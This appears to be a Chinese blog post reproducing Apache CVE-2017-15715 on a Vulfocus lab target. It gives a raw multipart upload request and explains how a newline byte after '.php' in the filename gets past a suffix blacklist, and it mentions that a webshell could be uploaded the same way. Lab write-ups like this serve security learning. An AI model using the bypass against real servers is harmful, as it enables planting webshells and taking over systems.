# 原创
：  【漏洞复现-Apache-文件上传】vulfocus/apache-cve_2017_15715

# 【漏洞复现-Apache-文件上传】vulfocus/apache-cve_2017_15715

 <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）后缀检测截断方法（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

> 
<h2> <img alt="" height="23" src="https://img-blog.csdnimg.cn/19e90c25b42d4b368c3c94da4b04afb0.png" width="23"/>让读者如虎添翼</h2>
<table border="1" cellpadding="1" cellspacing="1"><tbody>|文件上传漏洞复现|目标|状态
|[【漏洞复现-dedecms-文件上传】vulfocus/dedecms-cve_2019_8933](https://blog.csdn.net/qq_53079406/article/details/127348900)|后台的新建、上传文件功能、修改后缀功能|已发布
|[【漏洞复现-tomcat-弱口令+文件上传】vulfocus/tomcat-pass-getshell](https://blog.csdn.net/qq_53079406/article/details/127272129)|后台部署WAR报getshell|已发布
|[【漏洞复现-weblogic-文件上传】vulfocus/weblogic-cve_2018_2894](https://blog.csdn.net/qq_53079406/article/details/127257176)|后台新建、上传文件的功能点|已发布
|[【漏洞复现-showdoc-文件上传】​vulfocus/showdoc-cnvd_2020_26585](https://blog.csdn.net/qq_53079406/article/details/127251592)|构造上传文件的数据包|已发布
|[【漏洞复现-monstra-文件上传】vulfocus/monstra_cve_2020_13384](https://blog.csdn.net/qq_53079406/article/details/127241657)|PHP的特殊后缀绕过|已发布
|[【漏洞复现-oklite-文件上传】vulfocus/oklite-cve_2019_16131](https://blog.csdn.net/qq_53079406/article/details/127240000)|后台上传zip数据包，服务器自动解析|已发布
|[【漏洞复现-dcrCms-文件上传】vulfocus/dcrcms-cnvd_2020_27175](https://blog.csdn.net/qq_53079406/article/details/127238674)|后台上传点，修改上传文件的类型|已发布
|[【漏洞复现-TypesetterCms-文件上传ZIP】vulfocus/typesetter-cve_2020_25790](https://blog.csdn.net/qq_53079406/article/details/127235610)|后台自带解析功能|已发布
|[【漏洞复现-phpok-文件上传】vulfocus/phpok-cve_2018_12491](https://blog.csdn.net/qq_53079406/article/details/127229175)|后台新建、上传|已发布
|[【漏洞复现-EmpireCms-文件上传】vulfocus/empirecms-cve_2018_18086](https://blog.csdn.net/qq_53079406/article/details/127227989)|新建上传、特定后缀文件|已发布
|[【漏洞复现-Apache-文件上传】vulfocus/apache-cve_2017_15715](https://blog.csdn.net/qq_53079406/article/details/127196849)|后缀检测截断|已发布
|[【漏洞复现-jquery-文件上传】vulfocus/jquery-cve_2018_9207](https://blog.csdn.net/qq_53079406/article/details/127195214)|curl命令上传工具|已发布
|[【漏洞复现-Tomacat-文件上传】vulfocus/tomcat-cve_2017_12615](https://blog.csdn.net/qq_53079406/article/details/127197695)|JSP后门文件|已发布
|2023将更新更多，敬请期待|——|——
</tbody></table>


---


**目录**

[一、靶场环境](#%E4%B8%80%E3%80%81%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83)

[1.1、平台：](#1.1%E3%80%81%E5%B9%B3%E5%8F%B0%EF%BC%9A)

[1.2、知识:](#1.2%E3%80%81%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC%3A)

[1.3、描述：](#1.3%E3%80%81%E6%8F%8F%E8%BF%B0%EF%BC%9A)

[二、漏洞验证](#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.4、解题：](#2.4%E3%80%81%E8%A7%A3%E9%A2%98%EF%BC%9A)

---


## 一、靶场环境

> 
<h3>1.1、平台：</h3>
[Vulfocus 漏洞威胁分析平台](https://vulfocus.cn/)
123.58.224.8:41646









> 
<h3>1.2、知识:</h3>
1、%0a是换行符
2、对黑名单后缀的绕过
3、通过修改数据包请求方法，获得信息，上传数据



> 
<h3>1.3、描述：</h3>
此漏洞的出现是由于 apache 在修复第一个后缀名解析漏洞时，用正则来匹配后缀。在解析 php 时 xxx.php\x0A 将被按照 php 后缀进行解析，导致绕过一些服务器的安全策略


---


---


## 二、漏洞验证

> 
<h3>2.1、分析：</h3>
打开是一个空白页面


使用bp抓包，并发送到reapeater
可以找到版本信息（存在apache解析漏洞，可以绕过php黑名单限制）




OPTION提交
发现可以PUT上传



<hr/>
构造post文件，上传命令
（也可以上传马，然后连接）
（注意Host都不一样）
<pre><code>POST / HTTP/1.1
Host: 123.58.224.8:41646
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------9552222486401230933854482358
Content-Length: 357
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------9552222486401230933854482358
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: application/octet-stream

&lt;?php phpinfo();?&gt;
-----------------------------9552222486401230933854482358
Content-Disposition: form-data; name="name"

1.php

-----------------------------9552222486401230933854482358--</code></pre>

 考虑php黑名单限制



尝试换行符、截断等
这里用%0a换行（0a）
在后面多输入几个相同字符，占位，方便修改



第一个a的hex改为0a


 <img alt="" height="124" src="https://img-blog.csdnimg.cn/de29970157fc47d3a4d00afee1f6eef5.png" width="615"/>
 <img alt="" height="109" src="https://img-blog.csdnimg.cn/d4b3625ccbda42b1b436f1b92cf417ce.png" width="357"/>
 然后删除多余的a





<hr/>
http://ip:port/1.php%0A
被成功解析了





---


> 
<h3>2.4、解题：</h3>
Ctrl+f寻找关键字




---


---


> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
|雷神众测（可信众测，安恒）|[雷神众测 - BountyTeam](https://www.bountyteam.com/)
|云众可信（启明星辰）|[云众可信 - 互联网安全服务引领者](https://www.cloudcrowd.com.cn/)
|ALLSEC|[ALLSEC](https://i.allsec.cn/#/)
|360众测|[360众测平台](https://zhongce.360.cn/)
|看雪众测（物联网）|[https://ce.kanxue.com/](https://ce.kanxue.com/)
|CNVD众测平台|[网络安全众测平台](https://zc.cnvd.org.cn/)
|工控互联网安全测试平台|[CNCERT工业互联网安全测试平台](https://test.ics-cert.org.cn/)
|慢雾（区块链）|[Submit Bug Bounty - SlowMist Zone - Blockchain Ecosystem Security Zone](https://slowmist.io/bug-bounty.html)
|平安汇聚|[http://isrc.pingan.com/homePage/index](http://isrc.pingan.com/homePage/index)
</tbody></table>


<table border="1" cellpadding="1" cellspacing="1"><tbody>|互联网大厂|URL
|阿里|https://asrc.alibaba.com/#/
|腾讯|https://security.tencent.com/
|百度|https://bsrc.baidu.com/v2/#/home
|美团|https://security.meituan.com/#/home
|360|https://security.360.cn/
|网易|https://aq.163.com/
|字节跳动|https://security.bytedance.com/
|京东|https://security.jd.com/#/
|新浪|http://sec.sina.com.cn/
|微博|https://wsrc.weibo.com/
|搜狗|http://sec.sogou.com/
|金山办公|https://security.wps.cn/
|有赞|https://src.youzan.com/
</tbody></table>

<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/18b63058b35848b19967730eb49fcb45.png" width="24"/>Third Year </h3>
学习最新的知识，建全自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/7ccb45a55d5244edad5a9a1fabc55f08.png" width="23"/>目标：参与护网（每一个男孩子心中的梦想） 
时间：一般5月面试，6/7月开始（持续2-3周）
分类：国家级护网、省级护网、市级护网、重大节日护网（如：建党、冬奥等）


### <img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>second year 

---

